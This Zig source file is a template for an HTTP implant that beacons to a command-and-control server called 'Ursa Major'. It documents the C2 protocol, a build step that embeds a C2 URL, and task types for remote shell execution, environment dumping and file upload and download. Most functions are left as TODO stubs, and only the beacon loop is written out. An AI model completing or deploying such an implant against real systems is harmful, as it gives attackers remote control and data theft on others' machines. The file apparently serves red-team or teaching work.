// Ursa HTTP Implant Template — http_zig
// =======================================
// Skeleton for a Zig HTTP implant communicating with Ursa Major.
//
// Fill in every @panic("TODO") with your own implementation.
// The config block below is substituted by the builder at build time.
//
// BUILD
// -----
//   python -m implants.builder build \
//       --template http_zig \
//       --c2 http://10.0.0.1:6708 \
//       --output /tmp/agent.zig \
//       --post-build "zig build-exe {output} -femit-bin={binary}"
//
//   The builder substitutes the URSA_* tokens then runs zig build-exe
//   to produce a self-contained binary with no runtime dependencies.
//
// PROTOCOL (Ursa Major — major/server.py)
// ----------------------------------------
//   POST /register  body: {hostname, username, os, arch, pid, process}
//                   resp: {session_id: string, key: string (32-byte hex), crypto: {...}}
//
//   POST /beacon    body: {session_id: string, encrypted?: true}
//                   resp: {data: AES-GCM frame} or {tasks: [{id, type, args}]}
//
//   POST /result    body: {session_id, task_id, encrypted?: true, data?: AES-GCM frame}
//                   resp: {ok: true}
//
//   POST /upload    body: {session_id, encrypted?: true, data?: AES-GCM frame}
//                   resp: {file_id: string}
//
//   GET  /download/{file_id}
//                   resp: raw bytes
//
// TASK TYPES
// ----------
//   shell     args: {command: string}
//   sysinfo   args: {}
//   ps        args: {}
//   whoami    args: {}
//   pwd       args: {}
//   cd        args: {path: string}
//   ls        args: {path: string}
//   env       args: {}
//   download  args: {path: string}
//   upload    args: {path: string, data: base64}
//   sleep     args: {interval: u64, jitter: f64}
//   kill      args: {}
//
// USEFUL STD MODULES
// ------------------
//   std.http.Client        — HTTP/1.1 client (Zig 0.12+)
//   std.json               — JSON parse/stringify
//   std.process            — getenv, argv, exit
//   std.Thread             — spawn goroutine-style threads
//   std.time               — sleep, timestamp
//   std.fs                 — file I/O
//   std.base64             — base64 encode/decode

const std = @import("std");

// ── Config (substituted by builder at build time) ────────────────────────────
// After build these become e.g.:
//   const C2_URL: []const u8 = "http://10.0.0.1:6708";
//   const BEACON_INTERVAL: u64 = 5;
//   const BEACON_JITTER: f64 = 0.1;

const C2_URL: []const u8 = "URSA_C2_URL";
const BEACON_INTERVAL: u64 = URSA_INTERVAL; // numeric literal after build
const BEACON_JITTER: f64 = URSA_JITTER;     // numeric literal after build

// ─────────────────────────────────────────────────────────────────────────────

/// A pending task from the C2 server.
const Task = struct {
    id: []const u8,
    task_type: []const u8,
    // args is a raw JSON string — parse it inside execute() as needed.
    args_json: []const u8,
};

/// Main implant struct.
const Implant = struct {
    allocator: std.mem.Allocator,
    server: []const u8,
    interval: u64,
    jitter: f64,
    session_id: ?[]const u8,
    running: bool,

    pub fn init(allocator: std.mem.Allocator) Implant {
        return .{
            .allocator = allocator,
            .server = C2_URL,
            .interval = BEACON_INTERVAL,
            .jitter = BEACON_JITTER,
            .session_id = null,
            .running = true,
        };
    }

    // ── Transport ────────────────────────────────────────────────────────────

    /// POST JSON body to self.server ++ path.
    /// Returns the response body. Caller owns the returned slice.
    ///
    /// Hint: use std.http.Client from the standard library, or bring in
    /// a vendored HTTP library via build.zig deps.
    pub fn post(
        self: *Implant,
        path: []const u8,
        body: []const u8,
    ) ![]u8 {
        _ = self;
        _ = path;
        _ = body;
        @panic("TODO: implement HTTP POST");
    }

    /// GET self.server ++ path. Returns raw bytes. Caller owns the slice.
    pub fn get(self: *Implant, path: []const u8) ![]u8 {
        _ = self;
        _ = path;
        @panic("TODO: implement HTTP GET");
    }

    // ── Registration ─────────────────────────────────────────────────────────

    /// Register with C2. Populates self.session_id.
    ///
    /// POST /register with:
    ///   {hostname, username, os, arch, pid, process}
    /// Response:
    ///   {session_id: string, key: string, crypto: object}
    ///
    /// Store session_id on self for all future requests.
    pub fn register(self: *Implant) !void {
        _ = self;
        @panic("TODO: collect host info, POST /register, store session_id");
    }

    // ── Beacon / Results ─────────────────────────────────────────────────────

    /// Check in with C2. Returns slice of pending tasks. Caller owns.
    ///
    /// POST /beacon with {session_id}.
    /// Response: {tasks: [{id, type, args}]}.
    pub fn beacon(self: *Implant) ![]Task {
        _ = self;
        @panic("TODO: POST /beacon, parse tasks array");
    }

    /// Submit task output back to C2.
    ///
    /// POST /result with {session_id, task_id, result, error}.
    pub fn submitResult(
        self: *Implant,
        task_id: []const u8,
        result: []const u8,
        err: []const u8,
    ) !void {
        _ = self;
        _ = task_id;
        _ = result;
        _ = err;
        @panic("TODO: POST /result");
    }

    // ── Task Dispatch ─────────────────────────────────────────────────────────

    /// Dispatch a task by type. Returns allocated result string. Caller owns.
    /// Never propagate errors out — return an error string instead.
    ///
    /// Task types to handle:
    ///   shell, sysinfo, ps, whoami, pwd, cd, ls, env,
    ///   download, upload, sleep, kill
    pub fn execute(self: *Implant, task: Task) ![]u8 {
        _ = self;
        _ = task;
        @panic("TODO: dispatch task.task_type to individual handlers");
    }

    // ── Sleep ─────────────────────────────────────────────────────────────────

    /// Sleep for self.interval ± self.jitter seconds.
    ///
    /// Example:
    ///   var prng = std.rand.DefaultPrng.init(seed);
    ///   const rand_f = prng.random().float(f64);  // 0.0..1.0
    ///   const delta = self.jitter * (2.0 * rand_f - 1.0);
    ///   const ms: u64 = @intFromFloat(
    ///       @as(f64, @floatFromInt(self.interval)) * (1.0 + delta) * 1000.0
    ///   );
    ///   std.time.sleep(ms * std.time.ns_per_ms);
    pub fn sleep(self: *Implant) void {
        _ = self;
        @panic("TODO: sleep interval ± jitter");
    }

    // ── Main Loop ─────────────────────────────────────────────────────────────

    /// Entry point. Register, then loop: beacon → execute → submit → sleep.
    pub fn run(self: *Implant) !void {
        try self.register();

        while (self.running) {
            const tasks = self.beacon() catch |e| {
                std.debug.print("[!] beacon error: {}\n", .{e});
                self.sleep();
                continue;
            };
            defer self.allocator.free(tasks);

            for (tasks) |task| {
                const result = self.execute(task) catch |e| blk: {
                    const msg = std.fmt.allocPrint(
                        self.allocator,
                        "error: {}",
                        .{e},
                    ) catch "error";
                    break :blk msg;
                };
                defer self.allocator.free(result);
                self.submitResult(task.id, result, "") catch {};
            }

            self.sleep();
        }
    }
};

pub fn main() !void {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();

    var implant = Implant.init(gpa.allocator());
    try implant.run();
}
